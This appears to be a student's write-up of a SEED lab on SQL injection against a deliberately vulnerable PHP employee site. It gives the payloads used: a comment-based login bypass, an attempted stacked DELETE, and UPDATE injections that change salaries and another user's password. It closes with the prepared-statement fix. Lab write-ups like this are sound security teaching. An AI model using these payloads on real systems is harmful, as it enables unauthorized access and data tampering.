# Lab 5 - SQL Injection Attack

## Task 1: Get Familiar with SQL Statements

```console
mysql> select * from credential where name = 'alice';
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
| ID | Name  | EID   | Salary | birth | SSN      | PhoneNumber | Address | Email | NickName | Password                                 |
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
|  1 | Alice | 10000 |  20000 | 9/20  | 10211002 |             |         |       |          | fdbe918bdae83000aa54747fc95fe0470fff4976 |
+----+-------+-------+--------+-------+----------+-------------+---------+-------+----------+------------------------------------------+
1 row in set (0.00 sec)

```

## Task 2: SQL Injection Attack on SELECT Statement

### Part 2.1: SQL Injection Attack from webpage.

By appending the username with `' #` the the password check is bypassed. The # is to make SQL believe the rest of the code is a comment.

### Part 2.2: SQL Injection Attack from command line.

The username and password are sent as simple params using a simple GET method. Hence `http://www.seedlabsqlinjection.com/unsafe_home.php?username=admin%27+%23`is sufficient to get the result.

### Part 2.3: Append a new SQL statement.

To perform this, one would write a login statement that looked something like:

```
' or true; delete from credential where name = 'Alice' #
```

However this returns: `There was an error running the query [You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'delete from credential where name = 'Alice' #' and Password='da39a3ee5e6b4b0d325' at line 3]\n`.

This is because PHP doesn't allow multiple statements.

## Task 3: SQL Injection Attack on UPDATE Statement

### Part 3.1: Modify your own salary

`', salary = "39999" where eid = "10000" #`

### Part 3.2: Modify other people’ salary

`', salary = "1" where name = "boby" #`

### Part 3.3: Modify other people’ password

SHA1 of `123`= `40bd001563085fc35165329ea1ff5c5ecbdbbeef`

`', password = "40bd001563085fc35165329ea1ff5c5ecbdbbeef" where name = "boby" #`

## Task 4: Countermeasure — Prepared Statement

Old

```php
$sql = "SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password
    FROM credential
    WHERE name= ’$input_uname’ and Password=’$hashed_pwd’";
$result = $conn -> query($sql);
```

New

```php
$stmt = $conn->prepare("SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password
    FROM credential
    WHERE name = ? and password = ? ");
$stmt->bind_param("ss", $name, $Password); $stmt->execute();
$stmt->bind_result($bind_id, $bind_name, $bind_eid, $bind_salary, $bind_birth, $bind_ssn, $bind_address, $bind_email, $bind_nickname, $bind_Password); $stmt->fetch();
```

Old

```php
$hashed_pwd = sha1($input_pwd);
$sql = "UPDATE credential
    SET nickname=’$input_nickname’, email=’$input_email’, address=’$input_address’, Password=’$hashed_pwd’, PhoneNumber=’$input_phonenumber’
    WHERE ID=$id;";
$conn->query($sql);
```

New

```php
$hashed_pwd = sha1($input_pwd);
$stmt = $conn->prepare("UPDATE credential
    SET nickname=?, email=?, address=?, Password=?, PhoneNumber=?
    WHERE ID=?");
$stmt->bind_param("sssssi", $bind_nickname, $bind_email, $bind_address, $hashed_pwd, $bind_phoneNumber, $bind_id);
$stmt->execute();
```

When the code is updated to prepared statement it is no longer possible to inject SQL.
